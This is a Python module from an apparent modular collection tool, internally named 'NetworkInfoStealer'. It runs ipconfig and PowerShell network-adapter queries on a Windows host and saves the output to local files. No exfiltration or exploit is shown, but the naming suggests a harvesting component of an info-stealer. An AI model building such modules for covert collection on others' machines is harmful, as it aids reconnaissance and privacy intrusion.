import os
import subprocess
from pathlib import Path

from config import ModuleManager


class NetworkInfoRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "NetworkInfoStealer", module_path="network/general")
        
        self.banner(r"""
     _______         _______                               _       
    |.-----.|       (_______)        _                    | |      
    ||x . x||        _     _ _____ _| |_ _ _ _  ___   ____| |  _   
    ||_.-._||       | |   | | ___ (_   _) | | |/ _ \ / ___) |_/ )  
    `--)-(--`       | |   | | ____| | |_| | | | |_| | |   |  _ (  
   __[=== o]___     |_|   |_|_____)  \__)\___/ \___/|_|   |_| \_)  
  |:::::::::::|\    
  `-=========-`()                   Information
                    """)

        self.ipconfig_filename: Path = self.module_output / 'ipconfig.txt'
        self.ipconfiguration_filename: Path = self.module_output / 'ipconfiguration.txt'
        self.physical_adapters_filename: Path = self.module_output / 'physical_adapters.txt'
        self.getnet_ipconfig_filename: Path = self.module_output / 'getnet_ipinfo.txt'

    def ipconfig(self) -> None:
        self.mdebug("[ipconfig] Running command: `ipconfig /all`")
        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace").replace("\r\n", "\n").strip()
        self.ipconfig_filename.write_text(data, encoding="utf-8")
        self.mprint(f"[ipinfo] Saved result to {self.ipconfig_filename}")
    
    def ipconfiguration(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell get-wmiobject Win32_NetworkAdapterConfiguration`")
        data = subprocess.check_output(['powershell', 'get-wmiobject Win32_NetworkAdapterConfiguration']).decode('utf-8', errors="backslashreplace")
        self.ipconfiguration_filename.write_text(data, encoding="utf-8")
        self.mprint(f"[ipconfiguration] Saved result to {self.ipconfiguration_filename}")

    def physical_adapters(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell Get-NetAdapter -physical| where status -eq 'up'`")
        data = subprocess.check_output(['powershell', "Get-NetAdapter -physical| where status -eq 'up'"]).decode('utf-8', errors="backslashreplace")
        self.physical_adapters_filename.write_text(data, encoding="utf-8")
        self.mprint(f"[physical_adapters] Saved result to {self.physical_adapters_filename}")

    def getnet_ipconfig(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell Get-NetIPConfiguration -All`")
        data = subprocess.check_output(['powershell', "Get-NetIPConfiguration -All"]).decode('utf-8', errors="backslashreplace")
        self.getnet_ipconfig_filename.write_text(data, encoding="utf-8")
        self.mprint(f"[getnet_ipconfig] Saved result to {self.getnet_ipconfig_filename}")

    def run(self) -> None:
        __funcs__ = (
            'ipconfig', 'ipconfiguration', 
            'physical_adapters', 'getnet_ipconfig'
        )
        
        for func_name in __funcs__:
            try:
                self.mdebug(f"Running function `{func_name}()`")
                func = getattr(self, func_name)
                func()
            except (FileNotFoundError, subprocess.CalledProcessError):
                self.merror(f"[{func_name}] Unable to run `{func_name}()`")
            except Exception as e:
                self.merror(f"[{func_name}] Unable to run `{func_name}()` -> {e}")
                